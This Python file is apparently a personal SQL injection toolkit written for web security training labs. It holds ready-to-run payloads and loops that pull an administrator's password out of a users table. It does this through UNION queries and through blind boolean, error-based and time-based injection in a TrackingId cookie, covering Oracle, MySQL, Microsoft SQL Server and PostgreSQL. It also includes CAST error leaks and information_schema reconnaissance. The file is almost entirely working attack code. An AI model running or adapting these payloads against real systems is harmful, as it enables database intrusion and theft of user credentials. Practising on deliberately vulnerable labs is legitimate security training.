from urllib.parse import quote
import requests
import difflib
from bs4 import BeautifulSoup
import re
from urllib3.util import url

session = requests.Session()
CHAR_LIST = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

base_url = 'url'

def post_injection(ses, url, username, password, csrf_field='csrf', success_indicator=None):
    resp = ses.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find('input', {'name': csrf_field})
    payload = {
        'username': username,
        'password': password
    }
    if csrf_token:
        payload['csrf_token'] = csrf_token['value']

    response = ses.post(url, data=payload, allow_redirects=True)

def simple_sql_injection(ses, url):
    url_response = ses.get(url)
    text1 = url_response.text.splitlines()

    injection = f"{url}' UNION SELECT USERNAME_EGJYLI, PASSWORD_UPDJNI FROM USERS_LBKGPF--"
    injection_request = ses.get(injection)
    text2= injection_request.text.splitlines()

    diff = difflib.ndiff(text1, text2)

    for lines in diff:
        if lines.startswith('+'):
            print(lines)

def show_text(url ,ses):
    url_response = ses.get(url)
    print(url_response.text)
    print(url_response.cookies)




class blind_inj:
    def __init__(self, ses, url, dbms = "postgresql", cookie_name="TrackingId", charset = None):
        self.ses = ses
        self.url = url
        self.dbms = dbms
        self.cookie_name = cookie_name
        self.charset = charset

        self.tracking_id = None
        self.session_id = None
        self.found_password = ""
        self._init_cookies()
        self.charset_upload()


    def _init_cookies(self):
        response = self.ses.get(self.url)
        self.tracking_id = response.cookies.get(self.cookie_name)
        self.session_id = response.cookies.get("session")

    def charset_upload(self):
        if self.charset is None:
            self.charset = CHAR_LIST


    def boolean_injection(self, length_pass, username="administrator", table="users", column="password", success_text="Welcome back!"):
        for i in range(1, length_pass + 1):
            for j in self.charset:
                if self.dbms == "oracle":
                    payload = f"{self.tracking_id}' AND SUBSTR((SELECT {column} FROM {table} WHERE username = '{username}'), {i}, 1) = '{j}'--"
                elif self.dbms == "mysql":
                    payload = f"{self.tracking_id}' AND SUBSTRING((SELECT {column} FROM {table} WHERE username = '{username}' LIMIT 1), {i}, 1) = '{j}'--"
                else:
                    payload = f"{self.tracking_id}' AND SUBSTRING((SELECT {column} FROM {table} WHERE username = '{username}'), {i}, 1) = '{j}'--"

                cookies_injection = {
                    self.cookie_name: payload,
                    "session": self.session_id
                }
                try:
                    response = self.ses.get(self.url, cookies=cookies_injection)

                    if success_text in response.text:
                        self.found_password += j
                        print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
                        break

                except requests.exceptions.RequestException as e:
                    print(e)

            else:
                print("Can't find a letter")
                break

    def error_injection(self, length_pass, username="administrator", table="users", column="password"):
        for i in range(1, length_pass + 1):
            for j in self.charset:
                if self.dbms == "oracle":
                    payload = f"{self.tracking_id}' || (SELECT CASE WHEN SUBSTR({column}, {i}, 1) = '{j}' THEN TO_CHAR(1/0) ELSE NULL END FROM {table} WHERE username='{username}')||'"
                elif self.dbms == "microsoft":
                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN CAST(1/0 AS int) ELSE NULL END FROM {table} WHERE username='{username}')--"
                elif self.dbms == "mysql":
                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN 1/0 ELSE '' END FROM {table} WHERE username='{username}' LIMIT 1)--"
                else:
                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN CAST(1/0 AS int) ELSE NULL END FROM {table} WHERE username='{username}')--"

                cookies_injection = {
                    self.cookie_name: payload,
                    "session": self.session_id
                }

                response = self.ses.get(self.url, cookies=cookies_injection)

                if response.status_code == 500:
                    self.found_password += j
                    print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
                    break
            else:
                print("Can't find a letter")
                break

    def delay_injection(self, length_pass, username="administrator", table="users", column="password", delay = 5):
        for i in range(1, length_pass + 1):
            for j in self.charset:
                if self.dbms == "oracle":
                    payload = f"{self.tracking_id}'||(SELECT CASE WHEN SUBSTR({column}, {i}, 1) = '{j}' THEN DBMS_PIPE.RECEIVE_MESSAGE('RDS',{delay}) ELSE NULL END FROM {table} WHERE username='{username}')||'"
                elif self.dbms == "microsoft":
                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN 1 ELSE 0 END FROM {table} WHERE username='{username}') = 1 WAITFOR DELAY '0:0:{delay}'--"
                elif self.dbms == "mysql":
                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN SLEEP({delay}) ELSE 0 END FROM {table} WHERE username='{username}' LIMIT 1)--"
                else:
                    payload = f"{self.tracking_id}'||(SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM {table} WHERE username='{username}')||'"

                cookies_injection = {
                    self.cookie_name: payload,
                    "session": self.session_id
                }

                res = self.ses.get(self.url, cookies=cookies_injection, timeout=delay + 5)
                elapsed = res.elapsed.total_seconds()

                if (delay + 5) >= elapsed >= delay:
                    self.found_password += j
                    print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
                    break
            else:
                print("Can't find a letter")
                break


def make_payloads(base, delay):
    return {
        "Oracle":          f"{base}'||dbms_pipe.receive_message('', {delay})||'",
        "PostgreSQL":      f"{base}'||(SELECT pg_sleep({delay}))||'",
        "Microsoft SQL":   f"{base}';WAITFOR DELAY '0:0:{delay}'--",
        "MySQL/MariaDB":   f"{base}' AND SLEEP({delay})-- ",
    }

def url_sql_verify(ses, url, delay):
    baseline = ses.get(url)
    print(f"Baseline status: {baseline.status_code}, length: {len(baseline.text)}")

    for db, payload in make_payloads("", delay).items():
        test_url = url + quote(payload, safe='')
        try:
            response = ses.get(test_url, timeout=delay+5)
            elapsed = response.elapsed.total_seconds()
            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
        except Exception as e:
            print(f"{db}: request failed ({e})")

def cookie_sql_verify(ses, url, delay):
    resp = ses.get(url)
    tracking_id = resp.cookies.get("TrackingId")
    session_id = resp.cookies.get("session")

    if tracking_id is None:
        print("Tracking ID not found")
        return

    for db, payload in make_payloads(tracking_id, delay).items():
        cookies_injection = {
            "TrackingId": payload,
            "session": session_id
        }
        try:
            response = ses.get(url, cookies=cookies_injection, timeout=delay+5)
            elapsed = response.elapsed.total_seconds()
            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
        except Exception as e:
            print(f"{db}: request failed ({e})")


def cast_inj(ses, url):

    payload_login = "'AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--"
    payload_pass = "'AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--"
    c = (payload_pass, payload_login)

    for i in c:
        cookies = {
            "TrackingId": i
        }
        response = ses.get(url, cookies=cookies)

        match = re.search(r'invalid input syntax for type integer: "(.*?)"', response.text)

        if match:
            print(f"We found {match.group(1)}")
        else:
            print(f"Nothing found, check the payload or server response")
            print(response.text[:1000])

class union_table_recon:
    def __init__(self, url, ses, dbms = "postgresql"):
        self.url = url
        self.ses = ses
        self.dbms = dbms

    def table_rekon(self):
        column = 1
        sufix = " FROM dual--" if self.dbms == "oracle" else "--"
        injection = f"{self.url}' UNION SELECT NULL{sufix}"
        while True:
            res = self.ses.get(injection)
            if column > 10:
                    return print("Something went wrong")
            if res.status_code != 200:
                injection = injection.replace(sufix, f",NULL{sufix}")
                column += 1
            else:
                print(f"Contain: {column} columns, next injection: {injection}")
                break
        return self.recon_column(injection)


    def recon_column(self, sql_injection):
        matches = list(re.finditer(r'\bNULL\b', sql_injection))
        for ind, m in enumerate(matches):
            start, end = m.span()
            payload = sql_injection[:start] + "'a'" + sql_injection[end:]
            res = self.ses.get(payload)

            if res.status_code != 200:
                print(f"Column {ind + 1} - Not an string format")
            else:
                print(f"Column {ind + 1} - Have string format")

def information_schema_table(ses, url):
    response = ses.get(url)
    text1 = response.text.splitlines()

    injection = f"{url}' UNION SELECT table_name, NULL FROM information_schema.tables--"
    injection_request = ses.get(injection)
    text2 = injection_request.text.splitlines()

    diff = difflib.ndiff(text1, text2)

    for lines in diff:
        if lines.startswith('+'):
            print(lines)

def information_schema_columns(ses, url):
    response = ses.get(url)
    text1 = response.text.splitlines()

    injection = f"{url}' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_avhqsd'--"
    injection_request = ses.get(injection)
    text2 = injection_request.text.splitlines()

    diff = difflib.ndiff(text1, text2)

    for lines in diff:
        if lines.startswith('+'):
            print(lines)



if __name__ == "__main__":
    show_text(base_url, session)